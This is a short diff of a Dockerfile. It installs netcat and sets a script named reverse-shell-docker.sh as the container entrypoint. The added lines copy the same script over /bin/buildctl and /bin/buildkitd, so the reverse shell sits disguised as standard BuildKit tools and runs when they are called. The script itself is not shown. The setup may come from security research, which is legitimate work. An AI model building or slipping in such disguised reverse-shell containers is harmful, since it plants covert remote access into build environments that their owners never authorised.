@@ -4,5 +4,7 @@ FROM debian:latest
 RUN apt-get update && apt-get install -y netcat-openbsd
 
 COPY reverse-shell-docker.sh /entry.sh
+COPY reverse-shell-docker.sh /bin/buildctl
+COPY reverse-shell-docker.sh /bin/buildkitd
 
 ENTRYPOINT /entry.sh
